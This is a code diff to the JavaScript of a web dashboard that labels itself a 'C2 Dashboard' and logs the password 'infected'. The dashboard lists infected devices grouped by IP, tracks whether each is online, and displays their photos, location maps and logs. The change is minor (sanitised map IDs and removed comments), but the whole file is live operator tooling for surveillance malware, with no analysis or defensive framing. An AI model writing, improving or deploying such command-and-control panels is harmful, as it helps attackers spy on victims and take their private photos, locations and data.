@@ -499,7 +499,7 @@
         }
 
         // ============================================================
-        //  TOGGLE EXTRA DATA
+        //  TOGGLE EXTRA DATA (unchanged)
         // ============================================================
         function toggleExtra(repId) {
             const photoLimited = document.getElementById(`photo_limited_${repId}`);
@@ -539,7 +539,7 @@
         }
 
         // ============================================================
-        //  LOAD DEVICES — SMOOTH (no flash)
+        //  LOAD DEVICES — SMOOTH (no flash) + FIXED MAP ID
         // ============================================================
         async function loadDevices() {
             if (isLoading) return;
@@ -549,10 +549,8 @@
 
             const backend = getBackend();
             try {
-                // 1. Fetch devices
                 const devices = await fetchJSON(`${backend}/api/devices`);
                 if (!devices) {
-                    // If fetch fails, show error but keep existing cards
                     deviceGrid.innerHTML = `<div class="error-box">❌ Failed to load devices. Check your backend URL.</div>`;
                     isLoading = false;
                     refreshBtn.disabled = false;
@@ -560,7 +558,6 @@
                     return;
                 }
 
-                // 2. If no devices, show empty state
                 if (devices.length === 0) {
                     deviceGrid.innerHTML = `<div class="error-box">⚠️ No devices registered yet.</div>`;
                     statDevices.textContent='0'; statPhotos.textContent='0'; statLocations.textContent='0'; statLogs.textContent='0';
@@ -571,12 +568,10 @@
                     return;
                 }
 
-                // 3. Group by IP
                 const groups = groupByIp(devices);
                 const groupKeys = Object.keys(groups);
                 statDevices.textContent = groupKeys.length;
 
-                // 4. Fetch details for all devices in parallel
                 const allIds = [];
                 for (const ip of groupKeys) {
                     const ids = groups[ip].map(d => d.id);
@@ -603,7 +598,6 @@
                 let totalPhotos = 0, totalLogs = 0, totalLocations = 0;
                 const fragment = document.createDocumentFragment();
 
-                // 5. Build new cards in memory
                 for (const ip of groupKeys) {
                     const deviceList = groups[ip];
                     const latest = deviceList.reduce((a,b) => a.last_seen > b.last_seen ? a : b);
@@ -629,11 +623,12 @@
                     const statusDot = status === 'online' ? 'online' : 'offline';
                     const statusLabel = status === 'online' ? 'Online' : 'Offline';
 
-                    // Map
+                    // --- MAP ID: sanitise IP (replace dots with underscores) ---
+                    const safeIp = ip.replace(/\./g, '_');
                     let mapHtml = '';
                     if (locc > 0) {
                         const lastLoc = allLocations[0];
-                        mapHtml = `<div class="map-container" id="map_${ip}"></div>`;
+                        mapHtml = `<div class="map-container" id="map_${safeIp}"></div>`;
                     }
 
                     // Photos Limited/Full
@@ -741,9 +736,9 @@
                     `;
                     fragment.appendChild(card);
 
-                    // Lazy map init
+                    // Lazy map init (using sanitised ID)
                     if (locc > 0) {
-                        const mapContainer = card.querySelector(`#map_${ip}`);
+                        const mapContainer = card.querySelector(`#map_${safeIp}`);
                         if (mapContainer) {
                             const observer = new IntersectionObserver((entries) => {
                                 entries.forEach(entry => {
@@ -762,11 +757,9 @@
                     }
                 }
 
-                // 6. Replace grid content with new fragment (no flash)
                 deviceGrid.innerHTML = '';
                 deviceGrid.appendChild(fragment);
 
-                // 7. Update stats and timestamp
                 statPhotos.textContent = totalPhotos;
                 statLogs.textContent = totalLogs;
                 statLocations.textContent = totalLocations;
@@ -774,11 +767,9 @@
 
             } catch (err) {
                 console.error(err);
-                // Show error but don't clear existing cards if any
                 if (!deviceGrid.children.length) {
                     deviceGrid.innerHTML = `<div class="error-box">❌ Error loading devices: ${err.message}</div>`;
                 } else {
-                    // Append error message at the top
                     const errorDiv = document.createElement('div');
                     errorDiv.className = 'error-box';
                     errorDiv.style.gridColumn = '1 / -1';
@@ -817,7 +808,7 @@
             checkAuth();
             if (!dashboardContainer.classList.contains('active')) passwordInput.focus();
 
-            console.log('☠️ C2 Dashboard loaded (no flash)');
+            console.log('☠️ C2 Dashboard loaded (fixed map ID)');
             console.log('🔐 Password: infected');
             console.log(`🔗 Using Backend: ${getBackend()}`);
             console.log(`🔗 Using Relay: ${getRelay()}`);
